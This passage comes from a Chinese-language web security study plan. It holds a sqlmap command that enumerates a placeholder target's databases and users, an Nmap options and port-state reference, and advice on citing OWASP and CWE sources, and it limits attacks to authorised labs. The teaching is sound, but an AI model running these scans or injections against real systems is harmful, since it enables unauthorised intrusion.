python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
```

#### B.3.2 Nmap 官方命令速查

> 📌 来源：Nmap 官方参考手册 <https://nmap.org/book/man.html>

**端口状态含义（官方原文）**：

| 状态 | 含义 |
|------|------|
| `open` | 目标端口有应用在监听 |
| `filtered` | 防火墙/过滤器阻挡，无法判断开闭 |
| `closed` | 无应用监听 |
| `unfiltered` | 有响应但无法判断开闭 |

**官方示例扫描（原文 Example 15.1）**：

```bash
nmap -A -T4 scanme.nmap.org
```

`-A` 表示启用 OS 探测 + 版本探测 + 脚本扫描 + 路由跟踪；`-T4` 表示较快的时序模板。

**核心常用选项**：

| 选项 | 含义 |
|------|------|
| `-sS` | SYN 半开扫描（默认，需 root） |
| `-sT` | TCP 连接扫描（无需 root） |
| `-sV` | 版本探测（识别服务及版本） |
| `-sC` | 默认脚本扫描 |
| `-p <ports>` | 指定端口（如 `-p 80,443` 或 `-p-` 全端口） |
| `-O` | 操作系统探测 |
| `-Pn` | 跳过主机发现，直接扫描（目标禁 ping 时用） |
| `-oN/-oX/-oG <file>` | 输出到文件（普通/XML/grepable 格式） |
| `--script=<name>` | 运行指定 NSE 脚本 |
| `-T0~-T5` | 时序模板（越高越快，越易被检测） |

> 你已在第 5 章信息收集中学习 Nmap，这里补充官方端口状态定义和 `-A`/`-T4` 的权威解释，用于更准确地解读扫描结果。

---

### B.4 如何追踪与引用来源（学习方法论）

学习计划中标注来源的价值在于**可追溯、可验证**。建议养成以下习惯：

1. **记住权威源域名**：`cheatsheetseries.owasp.org`（OWASP 速查表）、`owasp.org/Top10`（Top 10）、`nist.gov/cyberframework`（CSF）、`cisecurity.org/controls`（CIS）、`cwe.mitre.org/top25`（CWE Top 25）。
2. **用 CWE/CVE 编号精准检索**：遇到漏洞，先找它的 CWE 编号（如 SQL 注入 = CWE-89），再去 `cwe.mitre.org` 看官方原理与修复。
3. **优先官方一手来源**：工具用法看官方 Wiki/手册（sqlmap、nmap、Burp），不要只信二手博客。
4. **记录版本号**：OWASP Top 10 有 2017/2021/2025 多个版本，引用时注明版本，避免用错结论。
5. **攻击性内容只用于授权环境**：所有漏洞利用命令仅限在 DVWA、sqli-labs、Vulhub 等你自建的靶场，或在获得书面授权的前提下使用。

---

> **最后的话**：Web 安全是一门需要长期积累的学科，本计划是你从零开始的路线图。建议按阶段推进，每学完一个漏洞就在靶场实操、记笔记、写博客，形成"学 → 练 → 沉淀"的闭环。遇到问题回到手册速查，坚持 6 个月到 1 年，你会看到质的飞跃。祝你学习顺利！
